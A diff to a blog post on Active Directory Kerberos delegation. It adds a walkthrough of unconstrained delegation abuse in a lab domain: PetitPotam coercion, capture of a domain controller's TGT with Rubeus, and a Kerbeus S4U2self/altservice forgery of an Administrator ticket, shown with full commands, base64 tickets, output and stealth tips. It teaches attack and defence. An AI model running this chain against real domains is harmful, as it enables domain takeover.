@@ -129,8 +129,8 @@ As expected we see that `WS01$` is configured with `TRUSTED_FOR_DELEGATION`
 > Domain Controllers are configured with unconstrained delegation by default, but that’s not particularly useful. If you’ve compromised the DC, it's already game over.
 {: .prompt-info }
 
-### Exploitation
-If we forced auth with high level user and used a tool like [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) to see what tickets are cached we can see that a high level user (administrator) has authenticated to the `WS01` and `WS01` cached it's TGT (we can tell it is TGT because the service is `KRBTGT`) 
+### Abusing Unconstrained Delegation #1
+If a high level user authenticate to `WS01` and we used a tool like [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) to see what tickets are cached we can see user `administrator` has authenticated to the `WS01` and `WS01` cached it's TGT (we can tell it is TGT because the service is `KRBTGT`) 
 
 ```shell
 beacon> krb_triage
@@ -198,6 +198,232 @@ We can see that it has `forwardable` flag enabled and that is exactly what we ne
 {: .prompt-danger }
 
 There are Numours ways to use this ticket one way is with Rubeus `createnetonly`, which uses the `CreateProcessWithLogonW()` API to spawn a new hidden process with logon type 9 (NewCredentials). Then we can then inject the ticket into that session and use it for network authentication.
+
+
+### Abusing Unconstrained Delegation #2 From Forced Authentication to Computer Takeover
+
+Waiting for a high level user to authenticate to them machine that we own isn't the most reliable way in real life scenarios, we are not guaranteed to have a high level user auth to us. 
+
+So instead of there is a way to get local admin on any machine by forging TGS for any user to that specific computer by:
+1. Forcing the targeted computer (`DC01`) to auth to us (via tools like `PetitPotam` or `SpoolSample`).
+2. Because of the delegation setting, `DC01` sends its own Machine Account TGT (DC01$) to our server. This ticket is now cached in `LSASS` of `SRV02`.
+3. We use this captured DC01$ TGT to perform an S4U2self request *(More details on this below)*. This asks the Domain Controller to give us a TGS for any user (like Administrator) to a service on that same machine.
+- *This works even if the user is marked as "Sensitive and cannot be delegated" because the computer is only delegating to itself, which bypasses that specific Kerberos restriction.*
+4. PtT using the new TGS. and since the service (like `cifs`) runs as `SYSTEM`, it can decrypt the ticket we just forged with the `DC01$` machine key.
+
+> You might be thinking why doing all this if we can have the DC's TGT we can just `DCSync` and own everything, well you are right but this applies to any computer account plus it is more OPSEC safe By using the DC's own identity to request a ticket for the Administrator, the resulting Kerberos traffic looks like standard protocol transition. Furthermore, using this ticket for administrative tasks is much stealthier than a `DCSync`, which generates massive replication traffic that modern SIEMs are specifically tuned to detect. If we need local admin to a certain computer (SQL server for example) this is a good technique to do it. 
+{: .prompt-info }
+
+
+Let's put all of this in action.
+
+#### 1. Forcing authentication
+we can use a tool like `PetitPotam` to force `DC01` to auth to our *— configured for unconstrained delegation machine —* `SRV02`
+```bash
+$ python3 PetitPotam.py  -d lol.local ws01.lol.local dc01.lol.local
+                                                                         
+              ___            _        _      _        ___            _                     
+             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
+             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
+            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
+          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
+          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+                                         
+              PoC to elicit machine account authentication via some MS-EFSRPC functions
+                                      by topotam (@topotam77)
+      
+                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
+
+
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:dc01.lol.local[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+
+```
+
+#### 2. Dumping DC01$ TGT from LSASS
+we can monitor for new TGTs or use `krb_triage`, let's use Rubeus this time:
+```shell
+C:\>.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: TGT Monitoring
+[*] Target user     : DC01$
+[*] Monitoring every 5 seconds for new TGTs
+
+
+[*] 3/30/2026 4:05:46 PM UTC - Found new TGT:
+
+  User                  :  DC01$@LOL.LOCAL
+  StartTime             :  3/30/2026 5:41:55 PM
+  EndTime               :  3/31/2026 3:41:14 AM
+  RenewTill             :  4/6/2026 5:41:14 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIE8jCCBO6gAwIBBaEDAgEWooIEAzCCA/9hggP7MIID96ADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDwTCCA72gAwIBEqEDAgECooIDrwSCA6vnyZxfyx4kZjMiUqIPE1WVRG11Qy5rLlvxncbSlWXGOIG+2IinCxjoIMZWDLrjlAlG8560bADLUoovkysecNUS7ufpYub9BMdLhYv7yLh/nUbp6x3lh7swHA7m9ET1ub5WMgsE+3Ovc89xPOKBYWByyX2zont0pdfdpuG8SGelgm6iELncH3Ek7uCkR/IYBtNZ14KgT+4nUCACj6x1pQ6Y1ZsM1vGHR+9Mmbjl1iemyImhTUfcjCSPGHL18CUkWEh1osOAVrppVqLq54nqXhDu/FKp1/I8H08l+R3kTGbsIgLFhkoq1qJXW6cxY/6KLP07pIUyuZY1hacDqLurnjR56rGNMyD2/xGlzpzwNlM0XEY4n6Y05UNYI+H9At09aMptYovzrwQ8h1S9d7LzzhpyDx0AqWkLwyl4Ug0xjI7vyUbm5mu2DLfN2OBOH+FwtC71eCfZCz1Zurk94nwSCAligM3K5DTEBHSwDSoVSh15fDMZlRX2da6a1iYGGze5uNvf8f6b79tbIJgab+UnX6qBKLvpkQXId6qPPu7qOybNiUktp+h/syAp4+myla3IxltMdyEP5M2fDhx7Vg6m2XsGto83W/nNWUbTbJb92uIPeuAdoxX95hgpTlH9Ma8jlMKyTjAWJGqJM3+UOo8ZOSN5kKZRxUoVpFyfUZHpNFGRKn1/KBReedV8nwBRLc1L0n8lqvbBbz6ZcYzqX0D8I69zwVXQ2dkGnbnQFfRjsAGn/GrbbgUcxVrcjpcnGvzcHAXRepxcYfeP4qhXp7yYFTvb348Q2UL7G8fOmtV0i7GLzOooDEXDOoOes2UovIUTRX4Bg/ljEmwO/Zh4Q9BXGEAaqhhq2t7SwAwVPl8dyeja2WP03jr1YgsSLg871S0mvOGvuo8morlTqKtpuzeHy8x6nYJuGIURNM64MNDaz7O6Yez5sNuE7fnDXZAZRZVCMJTa4U0Vwp4FDe0f5Xo/xaAhtxjY1IzlU9hhhx9XuxnBkeyOSUkFi8/CwixaLIXp4I18iYnU9LyTplDbf0efoVaY8QtMf6zvB7gZiBjow1QcBgTEC8yUqI0lqbChl+DPK/gEDFfE4IMPdEUM4FQJ21L/hXJOjyUpdQCwBpQJQSphjf3oFikw5ptLzzJTVpggcAplQXQ+zR/1PbVyRH5q/fVqf/aQ2CQxgAbr27PctyOjh8XAeo0wEOPifZeFo9gfLhGwWpR1JUo+EpYddw0qrqDy6KTkLzrtmrCF/gejgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaArMCmgAwIBEqEiBCAUfonuYfpWPX/pNptiAE0BHuGPxJsx6OMJa/itc9g41aELGwlMT0wuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDMzMDE0NDE1NVqmERgPMjAyNjAzMzEwMDQxMTRapxEYDzIwMjYwNDA2MTQ0MTE0WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==
+
+[*] Ticket cache size: 1
+```
+
+If we inject this ticket to our logon session and tried to list the `\\dc01\c$`, it won't work 
+```shell
+C:\>.\Rubeus.exe ptt /ticket:doIE8jCCBO6gAwIBBaEDAgEWooIEAzCCA/9hggP7MIID96ADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDwTCCA72gAwIBEqEDAgECooIDrwSCA6vnyZxfyx4kZjMiUqIPE1WVRG11Qy5rLlvxncbSlWXGOIG+2IinCxjoIMZWDLrjlAlG8560bADLUoovkysecNUS7ufpYub9BMdLhYv7yLh/nUbp6x3lh7swHA7m9ET1ub5WMgsE+3Ovc89xPOKBYWByyX2zont0pdfdpuG8SGelgm6iELncH3Ek7uCkR/IYBtNZ14KgT+4nUCACj6x1pQ6Y1ZsM1vGHR+9Mmbjl1iemyImhTUfcjCSPGHL18CUkWEh1osOAVrppVqLq54nqXhDu/FKp1/I8H08l+R3kTGbsIgLFhkoq1qJXW6cxY/6KLP07pIUyuZY1hacDqLurnjR56rGNMyD2/xGlzpzwNlM0XEY4n6Y05UNYI+H9At09aMptYovzrwQ8h1S9d7LzzhpyDx0AqWkLwyl4Ug0xjI7vyUbm5mu2DLfN2OBOH+FwtC71eCfZCz1Zurk94nwSCAligM3K5DTEBHSwDSoVSh15fDMZlRX2da6a1iYGGze5uNvf8f6b79tbIJgab+UnX6qBKLvpkQXId6qPPu7qOybNiUktp+h/syAp4+myla3IxltMdyEP5M2fDhx7Vg6m2XsGto83W/nNWUbTbJb92uIPeuAdoxX95hgpTlH9Ma8jlMKyTjAWJGqJM3+UOo8ZOSN5kKZRxUoVpFyfUZHpNFGRKn1/KBReedV8nwBRLc1L0n8lqvbBbz6ZcYzqX0D8I69zwVXQ2dkGnbnQFfRjsAGn/GrbbgUcxVrcjpcnGvzcHAXRepxcYfeP4qhXp7yYFTvb348Q2UL7G8fOmtV0i7GLzOooDEXDOoOes2UovIUTRX4Bg/ljEmwO/Zh4Q9BXGEAaqhhq2t7SwAwVPl8dyeja2WP03jr1YgsSLg871S0mvOGvuo8morlTqKtpuzeHy8x6nYJuGIURNM64MNDaz7O6Yez5sNuE7fnDXZAZRZVCMJTa4U0Vwp4FDe0f5Xo/xaAhtxjY1IzlU9hhhx9XuxnBkeyOSUkFi8/CwixaLIXp4I18iYnU9LyTplDbf0efoVaY8QtMf6zvB7gZiBjow1QcBgTEC8yUqI0lqbChl+DPK/gEDFfE4IMPdEUM4FQJ21L/hXJOjyUpdQCwBpQJQSphjf3oFikw5ptLzzJTVpggcAplQXQ+zR/1PbVyRH5q/fVqf/aQ2CQxgAbr27PctyOjh8XAeo0wEOPifZeFo9gfLhGwWpR1JUo+EpYddw0qrqDy6KTkLzrtmrCF/gejgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaArMCmgAwIBEqEiBCAUfonuYfpWPX/pNptiAE0BHuGPxJsx6OMJa/itc9g41aELGwlMT0wuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDMzMDE0NDE1NVqmERgPMjAyNjAzMzEwMDQxMTRapxEYDzIwMjYwNDA2MTQ0MTE0WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+C:\>klist
+
+Current LogonId is 0:0x926f3
+
+Cached Tickets: (1)
+
+#0>     Client: DC01$ @ LOL.LOCAL
+        Server: krbtgt/LOL.LOCAL @ LOL.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 3/30/2026 17:41:55 (local)
+        End Time:   3/31/2026 3:41:14 (local)
+        Renew Time: 4/6/2026 17:41:14 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+C:\>dir \\dc01\c$
+Access is denied.
+```
+This is because by default, a computer's machine account is not a member of its own local Administrators group for **network logons**. Therefore, even with the computer's TGT, we lack the administrative privileges. 
+
+If we run `klist` to list our tickets we will see that even though `DC01$` TGT was used to get a **VALID** `cifs` TGS we cannot list `c$`
+```shell
+C:\>klist
+
+Current LogonId is 0:0x926f3
+
+Cached Tickets: (3)
+
+#0>     Client: DC01$ @ LOL.LOCAL
+        Server: krbtgt/LOL.LOCAL @ LOL.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 3/30/2026 20:35:44 (local)
+        End Time:   3/31/2026 3:41:14 (local)
+        Renew Time: 4/6/2026 17:41:14 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x2 -> DELEGATION
+        Kdc Called: DC01.lol.local
+
+#1>     Client: DC01$ @ LOL.LOCAL
+        Server: krbtgt/LOL.LOCAL @ LOL.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 3/30/2026 17:41:55 (local)
+        End Time:   3/31/2026 3:41:14 (local)
+        Renew Time: 4/6/2026 17:41:14 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+        
+#2>     Client: DC01$ @ LOL.LOCAL
+        Server: cifs/dc01 @ LOL.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a50000 -> forwardable forwarded renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 3/30/2026 20:35:44 (local)
+        End Time:   3/31/2026 3:41:14 (local)
+        Renew Time: 4/6/2026 17:41:14 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: DC01.lol.local
+```
+This is a clean proof of the difference between **authentication and authorization**, we successfully authenticated, but authorization still shuts us down.
+
+This why we need the next step..
+
+#### 3. Request a S4U2Self
+The S4U2self request is a Kerberos extension that allows a service to ask the KDC for a TGS for any user to itself without any prior configuration.
+
+This was first pointed out by [elad shamir](https://twitter.com/elad_shamir) and was added to `Rubeus` later on. 
+
+What the tool does is a very normal S4U2Self that hands back a TGS (forwardable) that will be valid for a S4U2Proxy on behalf of the user(which we can't because there is no Constrained Delegation), but what `Rubeus` will do is *swaps* an unencrypted header (SPN) of that ticket with whatever in `/altservice` option. This works because all services on on a domain controller run under the exact same machine account `DC01$`, so they all share the exact same encryption key.
+```shell
+
+beacon> krb_s4u /impersonateuser:Administrator /self /altservice:cifs/dc01 /ticket:doIE8jCCBO6gAwIBBaEDAgEWooIEAzCCA/9hggP7MIID96ADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDwTCCA72gAwIBEqEDAgECooIDrwSCA6vnyZxfyx4kZjMiUqIPE1WVRG11Qy5rLlvxncbSlWXGOIG+2IinCxjoIMZWDLrjlAlG8560bADLUoovkysecNUS7ufpYub9BMdLhYv7yLh/nUbp6x3lh7swHA7m9ET1ub5WMgsE+3Ovc89xPOKBYWByyX2zont0pdfdpuG8SGelgm6iELncH3Ek7uCkR/IYBtNZ14KgT+4nUCACj6x1pQ6Y1ZsM1vGHR+9Mmbjl1iemyImhTUfcjCSPGHL18CUkWEh1osOAVrppVqLq54nqXhDu/FKp1/I8H08l+R3kTGbsIgLFhkoq1qJXW6cxY/6KLP07pIUyuZY1hacDqLurnjR56rGNMyD2/xGlzpzwNlM0XEY4n6Y05UNYI+H9At09aMptYovzrwQ8h1S9d7LzzhpyDx0AqWkLwyl4Ug0xjI7vyUbm5mu2DLfN2OBOH+FwtC71eCfZCz1Zurk94nwSCAligM3K5DTEBHSwDSoVSh15fDMZlRX2da6a1iYGGze5uNvf8f6b79tbIJgab+UnX6qBKLvpkQXId6qPPu7qOybNiUktp+h/syAp4+myla3IxltMdyEP5M2fDhx7Vg6m2XsGto83W/nNWUbTbJb92uIPeuAdoxX95hgpTlH9Ma8jlMKyTjAWJGqJM3+UOo8ZOSN5kKZRxUoVpFyfUZHpNFGRKn1/KBReedV8nwBRLc1L0n8lqvbBbz6ZcYzqX0D8I69zwVXQ2dkGnbnQFfRjsAGn/GrbbgUcxVrcjpcnGvzcHAXRepxcYfeP4qhXp7yYFTvb348Q2UL7G8fOmtV0i7GLzOooDEXDOoOes2UovIUTRX4Bg/ljEmwO/Zh4Q9BXGEAaqhhq2t7SwAwVPl8dyeja2WP03jr1YgsSLg871S0mvOGvuo8morlTqKtpuzeHy8x6nYJuGIURNM64MNDaz7O6Yez5sNuE7fnDXZAZRZVCMJTa4U0Vwp4FDe0f5Xo/xaAhtxjY1IzlU9hhhx9XuxnBkeyOSUkFi8/CwixaLIXp4I18iYnU9LyTplDbf0efoVaY8QtMf6zvB7gZiBjow1QcBgTEC8yUqI0lqbChl+DPK/gEDFfE4IMPdEUM4FQJ21L/hXJOjyUpdQCwBpQJQSphjf3oFikw5ptLzzJTVpggcAplQXQ+zR/1PbVyRH5q/fVqf/aQ2CQxgAbr27PctyOjh8XAeo0wEOPifZeFo9gfLhGwWpR1JUo+EpYddw0qrqDy6KTkLzrtmrCF/gejgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaArMCmgAwIBEqEiBCAUfonuYfpWPX/pNptiAE0BHuGPxJsx6OMJa/itc9g41aELGwlMT0wuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDMzMDE0NDE1NVqmERgPMjAyNjAzMzEwMDQxMTRapxEYDzIwMjYwNDA2MTQ0MTE0WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==
+[+] Kerbeus S4U by RalfHacker
+[+] host called home, sent: 69113 bytes
+[+] received output:
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'DC01$@LOL.LOCAL'
+[+] S4U2self success!
+[*] Substituting alternative service name 'cifs/dc01'
+[*] Got a TGS for 'Administrator' to 'cifs@LOL.LOCAL'
+[*] base64(ticket.kirbi):
+
+doIFTDCCBUigAwIBBaEDAgEWooIEXDCCBFhhggRUMIIEUKADAgEFoQsbCUxPTC5MT0NBTKIXMBWgAwIBAaEOMAwbBGNpZnMbBGRjMDGjggQhMIIEHaADAgESoQMCAQmiggQPBIIEC0hIzMl5g8jIw8kAMeQyMLuGARjwbdN+17dcv106TSaOxqWIlflL+Z94VR8KUEFrxcurPPfEg2UbX6n1Gz4+vudOHgn/HyChuWJlaZYlMIJUoRsxk6rcNqCKOgoGhPRSahDCiEMvw88VrqR+EOHj7RKFzMLxY13JBoXkjE133nu9ynsH98CisG/a+K9MB+qY9NQifW+uXb3iFyHg0jpjgVNUohmd3I9YtzfLd8RpSDwal8eBVqRjzpIUTHhb/Ao79KvrzpJrIzMNNdRZFKgMuLKhMzKQ1h0LyLaU3O8XF/zwZRLY5SALqZwd1gGRwlpEruERxr5SWHSeGyWhOG2Jrr7duLz6S1irRpjpUQr2pfJ/ma2WFCOId0DN4PnnWIFvMfjAx7sLovqlgl2P4xPJBaVKUWjKELXuAWoxxvZ3zKIjLd/hUhTJZwqxIoIdHoh36gL4yehHoYHVnmrDHSh2kPDWoj4sK+8tQ44vOOMrUYCSb8u9/iLo9QE5ArD9Ird0jlmf5WBrKF/AvaGQoAaB5A1uR3fFIfgum5QAnDeYweuWrNwMLFhapGfbGXQ6PlHDb5+aWvNuxBmrbt+C4KumNvfZSHCAfms5n+8PI34YJae8NJRwFrRqTkbhg7qatwOXUcGROu87MBZgCPPDsBZgWO4R/6QTDHWRhgTicO5FHDUubBKUVeEHhnj8AJgqxRuGmddnYlewzfrMUVcABnIF9KKwc1DoW+tLBQtMx4/UQ/S1z4sbk/vfKwz+xPDhpfewI4/8xDXv4f8qzfANhcjsuQUTJHVfCwTYAE/GbGpck2Knv160jTEV7M4eTKwCl8bnsTHIcXKWBoF9mIRtvxLJgTWGqBoSoMth442aj+os9y1irEsYPy8tsL9MUWCzZ3HAr+cFv3UqOepwmNv3/GkHBpAB0tF72qdX2y20s+iLY6Z7HT0qmYoXEH3bl5Y5m3VE9oOMxyOqLx7NOTd/Mr8lzNguQjrpOahpHndhaE7luY0OoXGchgdBLbAUFfbElceKo6DL7hPXW/sH08RGnaDYKSU5/Om+YpV3UqEXhpGMQdN6edR3AVgls8oa4pmdkmKeIjTlmtxNaNRbxTSqYkayKCJPFeExXgaZACupaEXsN6x8TWbCXeBbLB9l/Xb4iN/kRpHEZsZu0mShSeWCbrwk8EoZ+ZF6rGO+aZB59OZyq6P03WsupkzDLwJbBEC3mkFnJjvBIeT11r3/8v/Jhi/3yM/dDFArpVgsN5fhf9q4rcolmexJkiD7Hv0Lb/qXB3wBcQuon9BM1YmdP2+rF8jhGdMIq5lhExcxL0DPvS0oxpF33Qsj6LU/iIz94lvYhzlFE+qhDyFYIF6/g7efGe9/VAgplZBDXE4IZ2dYAKOB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oCswKaADAgESoSIEIDcBlO5bANv6TAj1lM9zVLZZGNwF0pFIjIaHCfQBwR9+oQsbCUxPTC5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFACClAAClERgPMjAyNjAzMzAxODMxMDNaphEYDzIwMjYwMzMxMDA0MTE0WqcRGA8yMDI2MDMzMTE4MzEwM1qoCxsJTE9MLkxPQ0FMqRcwFaADAgEBoQ4wDBsEY2lmcxsEZGMwMQ==
+```
+
+- `/impersonateuser`: The high-privilege identity we want to become (e.g., Administrator).
+- `/self`: Tells Rubeus to perform an S4U2self *"loopback"* request to the machine itself.
+- `/altservice`: Swaps the SPN to the target service (CIFS).
+- `/ticket`: The stolen TGT of the target machine account (DC01$).
+
+
+We can then use this ticket after injecting it to successfully list the content of the share:
+
+```shell
+beacon> dir \\dc01\c$
+[+] Running dir (T1135)
+[*] Running dir (T1135)
+[+] host called home, sent: 5905 bytes
+[+] received output:
+Contents of \\dc01\c$\*:
+	07/10/2025 02:22           <dir> $Recycle.Bin
+	06/07/2025 08:21      <junction> Documents and Settings
+	02/12/2026 16:43          328704 http.exe
+	03/09/2026 23:19         1118208 LAPS.x64.msi
+	03/30/2026 01:07      1275068416 pagefile.sys
+	09/15/2018 10:19           <dir> PerfLogs
+	03/29/2026 14:13           <dir> Program Files
+	06/07/2025 21:29           <dir> Program Files (x86)
+	03/09/2026 23:56           <dir> ProgramData
+	03/10/2026 07:37           <dir> Pwneddddd
+	06/07/2025 08:21           <dir> Recovery
+	03/28/2026 13:58           <dir> ShareSupport
+	02/24/2026 03:33           <dir> System Volume Information
+	03/26/2026 16:38           <dir> testshare
+	09/04/2025 07:18           <dir> Users
+	03/08/2026 08:06           <dir> Windows
+	                      1276515328 Total File Size for 3 File(s)
+	                                                     13 Dir(s)
+```
+
+
+
 
 ---
 
@@ -511,7 +737,7 @@ and then use the TGS.
 ![image](/assets/img/Delegation/8.png)
 
 
-Instead of full S4U chain (S4U2Self → S4U2Proxy), the service will skip the S4U2Self and will only do S4U2Proxy cause it has a valid proof of the user’s identity already, I will talk explain it in more details but let's first take a look to the traffic
+Instead of full S4U chain (S4U2Self → S4U2Proxy), the service will skip the S4U2Self and will only do S4U2Proxy cause it has a valid proof of the user’s identity already, I will explain it in more details but let's first take a look to the traffic
 ![image](/assets/img/Delegation/9.png)
 _Traffic Capture Of Kerberos Only Configuration_
 
@@ -542,7 +768,7 @@ Let's dive one level deep on one important packet, you guessed it... the S4U2Pro
 ![image](/assets/img/Delegation/10.png)
 
 
-Notices that now we only have 2 PA-DATA and it is missing the `PA-FOR-USER` that we saw earlier in [S4U2Self TGS-REQ requset](https://0xpix3l.github.io/Active-Directory/Delegation/#s4u2self-tgs-req).
+Notices that now we only have 2 PA-DATA and it is missing the `PA-FOR-USER` that we saw earlier in [S4U2Self TGS-REQ packet](https://0xpix3l.github.io/Active-Directory/Delegation/#s4u2self-tgs-req).
 
 We have some interesting parts to look at:
 ![image](/assets/img/Delegation/11.png)
@@ -682,13 +908,14 @@ Beside stealing a valid TGS from LSASS and fed it to a s4u2proxy attack chain, I
 ---
 
 ## TO-DO
-- S4U2Proxy abuse
+- More on S4U2Proxy abuse
 - Service Name Substitution
-- `/self` explaination
+- ~~`/self` explaination~~  [here](https://0xpix3l.github.io/Active-Directory/Delegation/#abusing-unconstrained-delegation-2-more-advanced)
 - ghost SPN 
 
 ## Refrences / Footnote
 
+[revisiting-delegate-2-thyself](https://exploit.ph/revisiting-delegate-2-thyself.html)
 
 [rfc4120](https://datatracker.ietf.org/doc/html/rfc4120)
 
